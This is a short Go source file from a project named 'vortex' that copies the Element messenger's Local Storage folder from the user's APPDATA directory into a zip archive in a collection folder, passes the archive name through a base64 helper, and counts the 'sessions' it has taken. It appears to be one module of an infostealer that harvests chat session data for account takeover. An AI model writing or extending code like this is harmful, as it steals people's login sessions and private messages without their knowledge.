package messenger

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func GetElementSession(mainFolder string) error {

	elementSession := filepath.Join(os.Getenv("APPDATA"), "Element", "Local Storage")

	if _, err := os.Stat(elementSession); os.IsNotExist(err) {
		return nil
	}

	if err := hutil.ZipFolder("Element", elementSession, filepath.Join(mainFolder, encrypt.B64Util("messenger-element-data.zip", 0)), "LOCK"); err != nil {
		return err
	}

	hutil.Sessions++

	return nil
}
